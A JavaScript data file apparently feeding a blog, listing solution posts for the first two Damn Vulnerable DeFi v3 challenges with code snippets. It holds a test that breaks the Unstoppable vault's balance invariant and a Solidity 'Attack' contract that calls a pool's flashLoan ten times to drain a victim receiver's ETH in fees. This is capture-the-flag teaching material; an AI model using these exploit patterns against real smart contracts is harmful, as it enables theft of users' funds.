export default {
    posts: [
        {
            id: "damn-vulnerable-defi-solutions-1-unstoppable",
            title: `Damn Vulnerable DeFi v3 Solutions 1: Unstoppable`,
            description: `Solution for the 1st Damn Vulnerable DeFi v3 challenge.`,
            date: "January 12, 2023",
            snippets: [
                `if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();`,
                `it("Execution", async function () {
  await token
      .connect(player)
      .transfer(vault.address, ethers.utils.parseEther("1"));
});`,
            ],
        },
        {
            id: "damn-vulnerable-defi-solutions-2-naive-receiver",
            title: `Damn Vulnerable DeFi v3 Solutions 2: Naive Receiver`,
            description: `Solution for the 2nd Damn Vulnerable DeFi v3 challenge.`,
            date: "January 12, 2023",
            snippets: [
                `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./NaiveReceiverLenderPool.sol";

contract Attack {
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    function init(address payable _pool, address _receiver) public {
        IERC3156FlashBorrower receiver = IERC3156FlashBorrower(_receiver);
        NaiveReceiverLenderPool pool = NaiveReceiverLenderPool(_pool);
        
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(receiver, ETH, 1 ether, "x0");
        }
    }
}`,
                `it("Execution", async function () {
    const attackContract = await (
        await ethers.getContractFactory("Attack", deployer)
    ).deploy();

    attackContract.init(pool.address, receiver.address);
});`,
            ],
        },
    ],
};
